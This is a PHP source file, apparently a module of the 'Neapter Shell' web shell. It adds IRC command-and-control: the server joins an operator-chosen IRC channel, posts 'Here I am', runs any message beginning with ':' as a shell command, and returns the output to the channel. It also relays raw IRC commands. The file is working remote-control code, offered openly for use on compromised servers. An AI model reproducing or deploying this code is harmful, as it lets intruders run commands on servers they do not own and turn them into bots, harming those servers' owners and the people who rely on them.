<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Class IrcException - Irc wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class IrcException extends Exception {}

/**
 * Class Irc - Laczenie sie z serwerem IRC
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class Irc
{
	/**
	 * Konfiguracja
	 *
	 * @access protected
	 * @var    array
	 */
	protected $aConfig = array
	(
		'host'     => NULL,
		'port'     => 6667,
		'nick'     => NULL,
		'channel'  => NULL,
		'password' => NULL
	);

	/**
	 * Nazwa funkcji zwrotnej
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sCallback;

	/**
	 * Polaczenie
	 *
	 * @access protected
	 * @var    string
	 */
	protected $rSock;

	/**
	 * Ustawianie hosta
	 *
	 * @access public
	 * @param  string $sValue Host:Port
	 * @return void
	 */
	public function setHost( $sValue )
	{
		@ list( $sHost, $iPort ) = explode( ':', $sValue );

		if( ctype_digit( $iPort ) )
		{
			$this -> aConfig['port'] = $iPort;
		}

		$this -> aConfig['host'] = $sValue;
	}

	/**
	 * Ustawianie nazwy kanalu
	 *
	 * @access public
	 * @param  string $sValue Kanal
	 * @return void
	 */
	public function setChannel( $sValue )
	{
		if( strncmp( $sValue, '#', 1 ) !== 0 )
		{
			$sValue = '#' . $sValue;
		}

		$this -> aConfig['channel'] = $sValue;
	}

	/**
	 * Ustawianie hasla do kanalu
	 *
	 * @access public
	 * @param  string $sValue Haslo
	 * @return void
	 */
	public function setPassword( $sValue )
	{
		$this -> aConfig['password'] = $sValue;
	}

	/**
	 * Ustawianie nazwy uzytkownika
	 *
	 * @access public
	 * @param  string $sValue Host:Port
	 * @return void
	 */
	public function setNick( $sValue )
	{
		$this -> aConfig['nick'] = $sValue;
	}

	/**
	 * Ustawianie funkcji zwrotnej
	 *
	 * @access public
	 * @param  string $sValue Host:Port
	 * @return void
	 */
	public function setCallback( $sValue )
	{
		$this -> sCallback = $sValue;
	}

	/**
	 * Wykonanie
	 *
	 * @access public
	 * @return void
	 */
	public function get()
	{
		/**
		 * Host jest wymagany
		 */
		if( $this -> aConfig['host'] === NULL )
		{
			throw new IrcException( 'Host jest wymagany' );
		}

		/**
		 * Kanal jest wymagany
		 */
		if( $this -> aConfig['channel'] === NULL )
		{
			throw new IrcException( 'Kanał jest wymagany' );
		}

		/**
		 * Nick jest wymagany
		 */
		if( $this -> aConfig['nick'] === NULL )
		{
			throw new IrcException( 'Nick jest wymagany' );
		}

		$this -> rSock = fsockopen( $this -> aConfig['host'], $this -> aConfig['port'] );

		fwrite( $this -> rSock, sprintf( "NICK %s\r\nUSER %s %s %s :%s\r\n", $this -> aConfig['nick'], $this -> aConfig['nick'], $this -> aConfig['nick'], $this -> aConfig['host'], $this -> aConfig['nick'] ) );

		while( strpos( fgets( $this -> rSock ), sprintf( ':%s MODE %s :+i', $this -> aConfig['nick'], $this -> aConfig['nick'] ) ) === FALSE )
		{
			usleep( 10000 );
		}

		/**
		 * Podlaczenie do kanalu
		 */
		fwrite( $this -> rSock, sprintf( "JOIN %s%s\r\n", $this -> aConfig['channel'], ( ( $this -> aConfig['password'] === NULL ) ? NULL : ' ' . $this -> aConfig['password'] ) ) );
		fgets( $this -> rSock );
		fwrite( $this -> rSock, sprintf( "MODE %s\r\n", $this -> aConfig['channel'] ) );
		fgets( $this -> rSock );
		fwrite( $this -> rSock, sprintf( "WHO %s\r\n", $this -> aConfig['channel'] ) );
		fgets( $this -> rSock );

		fwrite( $this -> rSock, sprintf( "PRIVMSG %s :Here I am\n", $this -> aConfig['channel'] ) );

		for( ;; )
		{
			$sData = fgets( $this -> rSock );
			usleep( 10000 );

			/**
			 * PING - PONG
			 */
			if( strncmp( $sData, 'PING', 4 ) === 0 )
			{
				$sPinger = rtrim( substr( $sData, 5 ) );
				fwrite( $this -> rSock, sprintf( ':%s PONG %s :%s', $sPinger, $sPinger, $sPinger ) );
				continue ;
			}

			if( ! preg_match( '~:(.+?)!([^ ]+) ([^ ]+) (.+?)\s?:([^\r\n]+)~', $sData, $aData ) )
			{
				continue ;
			}
			print_r( $aData );

			list( $NULL, $sFrom, $sIp, $sOption, $sTo, $sMessage ) = $aData;

			$sMessage = rtrim( $sMessage );

			/**
			 * Wyrzucony z serwera
			 */
			if( $sOption === 'KICK' )
			{
				exit ;
			}

			/**
			 * Publiczna wiadomosc
			 */
			$sType = NULL;
			if( $sTo === $this -> aConfig['channel'] )
			{
				$sType = 'public';
			}
			else if( $sTo === $this -> aConfig['nick'] )
			{
				$sType = 'private';
			}

			if( $sType !== NULL )
			{
				$aData = array
				(
					'type'    => $sType,
					'nick'    => $sFrom,
					'message' => $sMessage,
				);

				call_user_func( $this -> sCallback, $this, $this -> aConfig, $aData );
			}
		}
	}

	/**
	 * Wysylanie wiadomosci
	 *
	 * @access public
	 * @param  string $sType Typ wiadomosci: 'public', 'private'
	 * @param  string $sMsg  Tresc wiadomosci
	 * @param  string $sNick [Optional]<br>Nadawca (w przypadku $sType === 'private')
	 * @return void
	 */
	public function sendMessage( $sType, $sMsg, $sNick = NULL )
	{
		$aData = preg_split( '~\r\n|\r|\n~', $sMsg );

		if( ( $iCount = count( $aData ) ) > 15 )
		{
			fwrite( $this -> rSock, sprintf( "PRIVMSG %s :Ocipiałeś? Wynik ma %d linii !!!\r\n", ( ( $sType === 'public' ) ? $this -> aConfig['channel'] : $sNick ), $iCount ) );
			return ;
		}

		foreach( $aData as $sMessage )
		{
			fwrite( $this -> rSock, sprintf( "PRIVMSG %s :%s\r\n",  ( ( $sType === 'public' ) ? $this -> aConfig['channel'] : $sNick ), $sMessage ) );

			if( $iCount > 5 )
			{
				usleep( mt_rand( 200000, 1000000 ) );
			}
		}
	}

	/**
	 * Wysylanie surowej wiadomosci
	 *
	 * @access public
	 * @param  string $sData Dane
	 * @return void
	 */
	public function sendRawMessage( $sData )
	{
		fwrite( $this -> rSock, $sData . "\r\n" );
		usleep( mt_rand( 10000, 20000 ) );
	}

}

/**
 * =================================================================================================
 */

/**
 * ModuleIrc - Irc
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class ModuleIrc implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Obiekt Shell
	 *
	 * @static
	 * @access private
	 * @var    object
	 */
	private static $oShelll;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;

		self::$oShelll = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'irc' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-06-23 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Łączenie się z serwera Irc

	Użycie:
		irc host[:port] nick kanal [haslo]

	Przykład
		irc irc.freenode.net steffani #l33t passwd

	Dostępne polecenia, gdy shell połączony jest z serwerem:
		:exit   - zakończenie pracy shella (wymaga potwierdzenia)
		:ircmgs - wysłanie surowej wiadomośći
			':ircmgs KICK #kanal nick' - wyrzucenie użytkownika 'nick' z kanału '#kanal'
DATA;
	}

	public static function parseMessage( $oIrc, $aConfig, $aData )
	{
		static $sCaptcha;

		/**
		 * ircmsg, surowa wiadomosc
		 */
		if( strncmp( $aData['message'], ':ircmsg', 7 ) === 0 )
		{
			$oIrc -> sendRawMessage( substr( $aData['message'], 8 ) );
		}
		/**
		 * Polecenie zaczynajace sie od ':'
		 */
		if( preg_match( '~^:[a-z][a-z0-9]{1,}~', $aData['message'] ) )
		{
			$aMessageData = array();

			/**
			 * Polecenie EXIT
			 */
			if( strncmp( $aData['message'], ':exit', 5 ) === 0 )
			{
				if( $sCaptcha === substr( $aData['message'], 6 ) )
				{
					exit ;
				}
				else
				{
					$sCaptcha = md5( microtime( 1 ) );
					$sData = sprintf( 'Zabij mnie %s !!!', $sCaptcha );
				}
			}
			else
			{
				/**
				 * Tradycyjne polecenie
				 */
				$sData = self::$oShelll -> getActionBrowser( $aData['message'] );
			}

			/**
			 * Wiadomosc publiczna
			 */
			if( $aData['type'] === 'public' )
			{
				$aMessageData = array
				(
					'public',
					$sData,
				);
			}
			else
			{
				/**
				 * Wiadomosc prywatna
				 */
				$aMessageData = array
				(
					'private',
					$sData,
					$aData['nick']
				);
			}

			/**
			 * Wysylanie wiadomosci
			 */
			call_user_func_array( array( $oIrc, 'sendMessage' ), $aMessageData );
		}
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'Irc' ) )
		{
			return 'irc - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> oShell -> iArgc !== 3 ) && ( $this -> oShell -> iArgc !== 4 ) )
		{
			return $this -> getHelp();
		}

		try
		{
			$oIrc = new Irc();
			$oIrc -> setHost( $this -> oShell -> aArgv[0] );
			$oIrc -> setNick( $this -> oShell -> aArgv[1] );
			$oIrc -> setChannel( $this -> oShell -> aArgv[2] );
			$oIrc -> setCallback( 'ModuleIrc::parseMessage' );

			if( isset( $this -> oShell -> aArgv[3] ) )
			{
				$oIrc -> setPassword( $this -> oShell -> aArgv[3] );
			}

			$oIrc -> get();
		}
		catch( IrcException $oException )
		{
			return $oException -> getMessage();
		}
	}

}